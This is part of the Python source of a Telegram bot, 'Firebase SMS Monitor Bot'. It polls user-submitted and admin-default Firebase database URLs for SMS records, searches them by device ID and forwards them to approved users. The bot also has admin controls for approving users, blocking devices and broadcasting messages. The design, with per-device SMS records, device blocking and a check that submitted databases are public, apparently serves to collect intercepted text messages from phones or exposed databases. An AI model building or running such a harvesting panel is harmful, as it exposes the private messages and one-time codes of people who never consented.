    elif text == "🛑 Stop All Users" and is_admin:
        count = stop_all_watchers()
        send_msg(chat_id, f"🛑 Stopped {count} users", keyboard=get_admin_keyboard())
        return True
    
    # Default Firebase buttons
    elif text == "▶️ Start Default" and is_admin:
        if start_default_firebase():
            send_msg(chat_id, "✅ Default Firebase started", keyboard=get_default_firebase_keyboard())
        else:
            send_msg(chat_id, "❌ Failed to start Default Firebase", keyboard=get_default_firebase_keyboard())
        return True
    
    elif text == "⏹️ Stop Default" and is_admin:
        if stop_default_firebase():
            send_msg(chat_id, "✅ Default Firebase stopped", keyboard=get_default_firebase_keyboard())
        else:
            send_msg(chat_id, "ℹ️ Default Firebase not active", keyboard=get_default_firebase_keyboard())
        return True
    
    elif text == "🔄 Refresh Default" and is_admin:
        result = refresh_default_firebase()
        send_msg(chat_id, result, keyboard=get_default_firebase_keyboard())
        return True
    
    elif text == "📊 Default Status" and is_admin:
        status = "Active ✅" if default_firebase_active else "Inactive ❌"
        msg = f"📌 <b>Default Firebase</b>\nURL: <code>{DEFAULT_FIREBASE_URL}</code>\nStatus: {status}\nRefresh: Every {CACHE_REFRESH_SECONDS//60} min"
        send_msg(chat_id, msg, keyboard=get_default_firebase_keyboard())
        return True
    
    # Navigation buttons
    elif text == "◀️ Back to Admin" and is_admin:
        send_msg(chat_id, "👑 <b>Admin Panel</b>\n\nSelect an option:", keyboard=get_admin_keyboard())
        return True
    
    elif text == "◀️ Back to Main":
        send_msg(chat_id, "📱 <b>Main Menu</b>", keyboard=get_main_keyboard(is_admin))
        return True
    
    return False

def handle_update(u):
    if "callback_query" in u:
        # Handle callback queries if any (for inline keyboards)
        try:
            callback_id = u["callback_query"]["id"]
            requests.post(f"{API_URL}/answerCallbackQuery", json={"callback_query_id": callback_id})
        except:
            pass
        return
    
    msg = u.get("message") or {}
    chat = msg.get("chat", {}) or {}
    chat_id = chat.get("id")
    text = (msg.get("text") or "").strip()
    if not chat_id:
        return
    
    # Check if user is in waiting state
    if chat_id in user_states:
        state = user_states[chat_id]
        is_admin_user = is_owner(chat_id)
        
        if state == "waiting_for_device":
            del user_states[chat_id]
            # Process as find command
            text = f"/find {text}"
        
        elif state == "waiting_for_approve" and is_admin_user:
            del user_states[chat_id]
            text = f"/approve {text}"
        
        elif state == "waiting_for_unapprove" and is_admin_user:
            del user_states[chat_id]
            text = f"/unapprove {text}"
        
        elif state == "waiting_for_block" and is_admin_user:
            del user_states[chat_id]
            text = f"/block {text}"
        
        elif state == "waiting_for_unblock" and is_admin_user:
            del user_states[chat_id]
            text = f"/unblock {text}"
        
        elif state == "waiting_for_broadcast" and is_admin_user:
            del user_states[chat_id]
            text = f"/broadcast {text}"
    
    # Handle button presses
    is_admin = is_owner(chat_id)
    if text in ["📋 My URLs", "🔍 Find Device", "🔄 Refresh Cache", "🏓 Status", "🛑 Stop All", "❓ Help", "👑 Admin Panel",
                "👥 Approve User", "🚫 Unapprove User", "📋 All Users", "📊 Statistics", "🔒 Block Device", "🔓 Unblock Device",
                "📵 Blocked List", "🌐 Default Firebase", "📢 Broadcast", "🛑 Stop All Users", "▶️ Start Default", "⏹️ Stop Default",
                "🔄 Refresh Default", "📊 Default Status", "◀️ Back to Admin", "◀️ Back to Main"]:
        if handle_button_press(chat_id, text, is_admin):
            return
    
    # Process commands
    if not text:
        return
    
    if text.lower() == "/find" and msg.get("reply_to_message"):
        reply = msg.get("reply_to_message")
        for line in (reply.get("text") or "").splitlines():
            if "Device:" in line:
                text = "/find " + line.split("Device:", 1)[1].strip()
                break
    
    lower_text = text.lower()
    
    if not is_approved(chat_id):
        handle_not_approved(chat_id, msg)
        return
    
    # /start
    if lower_text == "/start":
        welcome_msg = (
            "👋 <b>Welcome to Firebase SMS Monitor Bot!</b>\n\n"
            "I monitor Firebase databases for SMS messages and notify you instantly.\n\n"
            "📱 <b>Features:</b>\n"
            "• Real-time SMS monitoring\n"
            "• Multiple Firebase URLs support\n"
            "• Device blocking\n"
            "• Search records by device ID\n"
            "• Cache system for faster access\n\n"
            "🎯 <b>Quick Start:</b>\n"
            "• Send me a Firebase URL to start monitoring\n"
            "• Use the buttons below for easy access\n"
            "• Type /help for all commands\n\n"
            "🔐 <b>Note:</b> This bot is monitored by admin"
        )
        send_msg(chat_id, welcome_msg, keyboard=get_main_keyboard(is_admin))
        return
    
    # /refresh
    if lower_text.startswith("/refresh"):
        parts = text.split(maxsplit=1)
        if len(parts) == 1:
            result = manual_refresh_cache(chat_id)
        else:
            url = parts[1].strip()
            if url.startswith("http"):
                result = manual_refresh_cache(chat_id, url)
            else:
                result = "❌ Invalid URL"
        send_msg(chat_id, result, keyboard=get_main_keyboard(is_admin))
        return
    
    # /ping
    if lower_text == "/ping":
        uptime = format_uptime(int(time.time() - BOT_START_TIME))
        speed = get_network_speed()
        msg_text = (
            f"🏓 <b>Bot Status</b>\n\n"
            f"✅ Online\n"
            f"⏱ Uptime: {uptime}\n"
            f"📡 Your URLs: {len(firebase_urls.get(chat_id, []))}/{MAX_FIREBASE_PER_USER}\n"
            f"🌐 Total: {sum(len(u) for u in firebase_urls.values())}\n"
            f"📶 Download: {speed['download']}\n"
            f"⬆️ Upload: {speed['upload']}\n"
            f"📍 Ping: {speed['ping']}"
        )
        if is_admin:
            msg_text += f"\n\n👑 Default: {'Active' if default_firebase_active else 'Inactive'}"
        send_msg(chat_id, msg_text, keyboard=get_main_keyboard(is_admin))
        return
    
    # /stop
    if lower_text.startswith("/stop"):
        parts = text.split(maxsplit=1)
        if len(parts) == 1:
            stop_watcher_single(chat_id)
        else:
            url = parts[1].strip()
            if url.startswith("http"):
                stop_watcher_single(chat_id, url)
            else:
                send_msg(chat_id, "❌ Invalid URL")
        send_msg(chat_id, "✅ Done", keyboard=get_main_keyboard(is_admin))
        return
    
    # /list
    if lower_text == "/list":
        urls = firebase_urls.get(chat_id, [])
        if not urls and (not is_admin or not default_firebase_active):
            send_msg(chat_id, "ℹ️ No active URLs", keyboard=get_main_keyboard(is_admin))
        else:
            text_msg = f"📋 Your URLs ({len(urls)}/{MAX_FIREBASE_PER_USER}):\n\n"
            for i, url in enumerate(urls, 1):
                text_msg += f"{i}. <code>{url}</code>\n"
            if is_admin and default_firebase_active:
                text_msg += f"\n📌 <b>Default Firebase (Admin Only):</b>\n   <code>{DEFAULT_FIREBASE_URL}</code>"
            send_msg(chat_id, text_msg, keyboard=get_main_keyboard(is_admin))
        return
    
    # /adminlist
    if lower_text == "/adminlist":
        if not is_admin:
            send_msg(chat_id, "❌ Admin only")
            return
        if not firebase_urls:
            send_msg(chat_id, "No active URLs")
            return
        lines = []
        for uid, urls in firebase_urls.items():
            lines.append(f"👤 <code>{uid}</code> ({len(urls)}):")
            for url in urls:
                lines.append(f"   • <code>{url}</code>")
        msg = "👑 All URLs:\n\n" + "\n".join(lines)
        if default_firebase_active:
            msg += f"\n\n📌 Default Firebase: Active\nURL: <code>{DEFAULT_FIREBASE_URL}</code>"
        send_msg(chat_id, msg[:4000], keyboard=get_admin_keyboard())
        return
    
    # Admin default commands
    if is_admin:
        if lower_text == "/default_start":
            if start_default_firebase():
                send_msg(chat_id, "✅ Default started", keyboard=get_admin_keyboard())
            else:
                send_msg(chat_id, "❌ Failed", keyboard=get_admin_keyboard())
            return
        if lower_text == "/default_stop":
            if stop_default_firebase():
                send_msg(chat_id, "✅ Default stopped", keyboard=get_admin_keyboard())
            else:
                send_msg(chat_id, "ℹ️ Not active", keyboard=get_admin_keyboard())
            return
        if lower_text == "/default_refresh":
            send_msg(chat_id, refresh_default_firebase(), keyboard=get_admin_keyboard())
            return
        if lower_text == "/default_status":
            status = "Active ✅" if default_firebase_active else "Inactive ❌"
            msg = f"📌 Default Firebase\nURL: <code>{DEFAULT_FIREBASE_URL}</code>\nStatus: {status}\nRefresh: Every {CACHE_REFRESH_SECONDS//60} min"
            send_msg(chat_id, msg, keyboard=get_admin_keyboard())
            return
    
    # /block
    if lower_text.startswith("/block"):
        if not is_admin:
            send_msg(chat_id, "❌ Admin only")
            return
        reply = msg.get("reply_to_message")
        if reply and reply.get("text"):
            device = extract_device_id_from_message(reply.get("text"))
            if device:
                block_device(device)
                send_msg(chat_id, f"✅ Blocked: <code>{device}</code>", keyboard=get_admin_keyboard())
                return
        parts = text.split()
        if len(parts) < 2:
            send_msg(chat_id, "Usage: /block device_id or reply to message", keyboard=get_admin_keyboard())
            return
        block_device(parts[1])
        send_msg(chat_id, f"✅ Blocked: <code>{parts[1]}</code>", keyboard=get_admin_keyboard())
        return
    
    # /unblock
    if lower_text.startswith("/unblock"):
        if not is_admin:
            send_msg(chat_id, "❌ Admin only")
            return
        parts = text.split()
        if len(parts) < 2:
            send_msg(chat_id, "Usage: /unblock device_id", keyboard=get_admin_keyboard())
            return
        if unblock_device(parts[1]):
            send_msg(chat_id, f"✅ Unblocked: <code>{parts[1]}</code>", keyboard=get_admin_keyboard())
        else:
            send_msg(chat_id, f"ℹ️ Not blocked", keyboard=get_admin_keyboard())
        return
    
    # /blockedlist
    if lower_text == "/blockedlist":
        if not is_admin:
            send_msg(chat_id, "❌ Admin only")
            return
        devices = get_blocked_devices()
        if not devices:
            send_msg(chat_id, "📭 No blocked devices", keyboard=get_admin_keyboard())
        else:
            text_msg = "📵 Blocked Devices:\n\n" + "\n".join([f"• <code>{d}</code>" for d in devices])
            send_msg(chat_id, text_msg, keyboard=get_admin_keyboard())
        return
    
    # /stopall
    if lower_text == "/stopall":
        if not is_admin:
            send_msg(chat_id, "❌ Admin only")
            return
        count = stop_all_watchers()
        send_msg(chat_id, f"🛑 Stopped {count} users", keyboard=get_admin_keyboard())
        return
    
    # /broadcast
    if lower_text.startswith("/broadcast"):
        if not is_admin:
            send_msg(chat_id, "❌ Admin only")
            return
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_msg(chat_id, "Usage: /broadcast message", keyboard=get_admin_keyboard())
            return
        result = broadcast_message(chat_id, parts[1])
        send_msg(chat_id, result, keyboard=get_admin_keyboard())
        return
    
    # /stats
    if lower_text == "/stats":
        if not is_admin:
            send_msg(chat_id, "❌ Admin only")
            return
        uptime = format_uptime(int(time.time() - BOT_START_TIME))
        total_users = len(firebase_urls)
        total_monitors = sum(len(u) for u in firebase_urls.values())
        stats = (
            f"📊 Stats\n\n"
            f"Uptime: {uptime}\n"
            f"Approved: {len(approved_users)}\n"
            f"Active Users: {total_users}\n"
            f"Monitors: {total_monitors}\n"
            f"Unique URLs: {len(used_firebase_urls)}\n"
            f"Blocked Devices: {len(blocked_devices)}\n"
            f"Default: {'Active' if default_firebase_active else 'Inactive'}\n"
            f"Cache: Every {CACHE_REFRESH_SECONDS//60} min"
        )
        send_msg(chat_id, stats, keyboard=get_admin_keyboard())
        return
    
    # /approve
    if lower_text.startswith("/approve"):
        if not is_admin:
            send_msg(chat_id, "❌ Admin only")
            return
        parts = text.split()
        if len(parts) < 2:
            send_msg(chat_id, "Usage: /approve user_id", keyboard=get_admin_keyboard())
            return
        try:
            target = int(parts[1])
            approved_users.add(target)
            send_msg(chat_id, f"✅ Approved: <code>{target}</code>", keyboard=get_admin_keyboard())
            send_msg(target, "✅ Approved! You can now use the bot.\nSend /start to begin")
        except:
            send_msg(chat_id, "❌ Invalid ID", keyboard=get_admin_keyboard())
        return
    
    # /unapprove
    if lower_text.startswith("/unapprove"):
        if not is_admin:
            send_msg(chat_id, "❌ Admin only")
            return
        parts = text.split()
        if len(parts) < 2:
            send_msg(chat_id, "Usage: /unapprove user_id", keyboard=get_admin_keyboard())
            return
        try:
            target = int(parts[1])
            if target in OWNER_IDS:
                send_msg(chat_id, "❌ Cannot unapprove owner", keyboard=get_admin_keyboard())
                return
            if target in approved_users:
                approved_users.remove(target)
                stop_watcher_single(target)
                send_msg(chat_id, f"🚫 Unapproved: <code>{target}</code>", keyboard=get_admin_keyboard())
                send_msg(target, "❌ Your access has been revoked")
            else:
                send_msg(chat_id, f"ℹ️ Not approved", keyboard=get_admin_keyboard())
        except:
            send_msg(chat_id, "❌ Invalid ID", keyboard=get_admin_keyboard())
        return
    
    # /approvedlist
    if lower_text == "/approvedlist":
        if not is_admin:
            send_msg(chat_id, "❌ Admin only")
            return
        if not approved_users:
            send_msg(chat_id, "No approved users", keyboard=get_admin_keyboard())
            return
        lines = []
        for uid in sorted(approved_users):
            tag = "👑" if uid in OWNER_IDS else ""
            active = "✅" if uid in firebase_urls else "❌"
            count = len(firebase_urls.get(uid, []))
            lines.append(f"{active} <code>{uid}</code> ({count}) {tag}")
        send_msg(chat_id, "✅ Approved Users:\n\n" + "\n".join(lines), keyboard=get_admin_keyboard())
        return
    
    # /find
    if lower_text.startswith("/find"):
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_msg(chat_id, "Usage: /find device_id\n\nOr use the 🔍 Find Device button", keyboard=get_main_keyboard(is_admin))
            return
        device = parts[1].strip()
        urls = firebase_urls.get(chat_id, [])
        
        search_default = is_admin and default_firebase_active
        
        if not urls and not search_default:
            send_msg(chat_id, "❌ No active URLs to search", keyboard=get_main_keyboard(is_admin))
            return
        
        found = False
        results = []
        
        for url in urls:
            snap = http_get_json(normalize_json_url(url))
            if not snap:
                continue
            matches = search_records_by_device(snap, device)
            if matches:
                found = True
                for rec in matches[:3]:
                    results.append(safe_format_device_record(rec, url))
        
        if search_default:
            snap = http_get_json(normalize_json_url(DEFAULT_FIREBASE_URL))
            if snap:
                matches = search_records_by_device(snap, device)
                if matches:
                    found = True
                    for rec in matches[:3]:
                        results.append(safe_format_device_record(rec, f"{DEFAULT_FIREBASE_URL} (Default)"))
        
        if found:
            for result in results[:3]:
                send_msg(chat_id, result, keyboard=get_main_keyboard(is_admin))
            if len(results) > 3:
                send_msg(chat_id, f"📌 Found {len(results)} records. Showing first 3.", keyboard=get_main_keyboard(is_admin))
        else:
            send_msg(chat_id, "🔍 No records found for this device", keyboard=get_main_keyboard(is_admin))
        return
    
    # Firebase URL
    if text.startswith("http"):
        if text == DEFAULT_FIREBASE_URL or text == normalize_json_url(DEFAULT_FIREBASE_URL):
            if not is_admin:
                send_msg(chat_id, "❌ Default Firebase is for admin only", keyboard=get_main_keyboard(is_admin))
                return
        
        if text in used_firebase_urls and text not in firebase_urls.get(chat_id, []):
            admin_using = any(text in firebase_urls.get(oid, []) for oid in OWNER_IDS)
            if not admin_using and not is_admin:
                send_msg(chat_id, "❌ URL already in use by another user", keyboard=get_main_keyboard(is_admin))
                return
        test_url = normalize_json_url(text)
        if not http_get_json(test_url):
            send_msg(chat_id, "❌ Cannot fetch URL. Make sure it's public", keyboard=get_main_keyboard(is_admin))
            return
        if request_permission(chat_id, text):
            if start_watcher(chat_id, text):
                send_msg(OWNER_IDS, f"👤 User <code>{chat_id}</code> started:\n<code>{text}</code>")
                send_msg(chat_id, f"✅ Monitoring started!", keyboard=get_main_keyboard(is_admin))
        return
    
    # /help
    if lower_text == "/help":
        if is_admin:
            help_msg = (
                "📚 <b>Full Help</b>\n\n"
                "👤 <b>User Commands:</b>\n"
                "• /start - Welcome message\n"
                "• /stop - Stop all monitoring\n"
                "• /stop <url> - Stop specific\n"
                "• /list - Your URLs\n"
                "• /find <id> - Search device\n"
                "• /ping - Status & speed\n"
                "• /refresh [url] - Refresh cache\n\n"
                "👑 <b>Admin Commands:</b>\n"
                "• /adminlist - All URLs\n"
                "• /approve <id> - Approve user\n"
                "• /unapprove <id> - Remove\n"
                "• /approvedlist - List users\n"
                "• /block <id> - Block device\n"
                "• /unblock <id> - Unblock\n"
                "• /blockedlist - Blocked devices\n"
                "• /stopall - Stop all\n"
                "• /broadcast <msg> - Broadcast\n"
                "• /stats - Statistics\n"
                "• /default_start - Start default\n"
                "• /default_stop - Stop default\n"
                "• /default_refresh - Refresh default\n"
                "• /default_status - Default status\n\n"
                "🎯 <b>Using Buttons:</b>\n"
                "Use the buttons below for quick access to all features!\n\n"
                "📝 Send Firebase URL to start monitoring\nCache refreshes every 20 min\nMax 5 URLs per user"
            )
        else:
            help_msg = (
                "📚 <b>Help</b>\n\n"
                "<b>Commands:</b>\n"
                "• /start - Welcome message\n"
                "• /stop - Stop all monitoring\n"
                "• /stop <url> - Stop specific\n"
                "• /list - Your URLs\n"
                "• /find <id> - Search device\n"
                "• /ping - Status & speed\n"
                "• /refresh [url] - Refresh cache\n"
                "• /help - This message\n\n"
                "<b>Using Buttons:</b>\n"
                "Use the buttons below to access features easily!\n\n"
                "📝 Send Firebase URL to start monitoring\nCache refreshes every 20 min\nMax 5 URLs per user"
            )
        send_msg(chat_id, help_msg, keyboard=get_main_keyboard(is_admin))
        return
    
    # Unknown command
    send_msg(chat_id, "❓ Unknown command. Use /help or the buttons below.", keyboard=get_main_keyboard(is_admin))

# ---------- MAIN ----------
def main_loop():
    send_msg(OWNER_IDS, "🤖 Bot started with Keyboard Support!")
    print("Bot running...")
    global running
    
    if DEFAULT_FIREBASE_ENABLED:
        time.sleep(2)
        start_default_firebase()
    
    while running:
        updates = get_updates()
        for u in updates:
            try:
                handle_update(u)
            except Exception as e:
                print("Error:", e)
        time.sleep(0.5)

if __name__ == "__main__":
    try:
        threading.Thread(target=cache_refresher_loop, daemon=True).start()
        print("✅ Cache refresher started (20 min)")
        main_loop()
    except KeyboardInterrupt:
        running = False
        print("Shutting down")
    except Exception as e:
        print(f"Fatal: {e}")
        send_msg(OWNER_IDS, f"❌ Bot crashed: {str(e)}")
